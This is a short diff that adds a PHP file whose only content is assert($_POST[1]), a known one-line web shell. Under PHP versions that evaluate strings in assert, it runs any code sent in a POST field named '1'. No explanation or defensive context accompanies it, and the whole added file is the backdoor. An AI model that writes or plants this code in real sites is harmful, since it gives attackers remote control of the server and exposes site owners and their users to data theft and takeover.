@@ -1,0 +1,7 @@
+php:
+
+<?php
+assert(
+$_POST[1]
+);
+?>
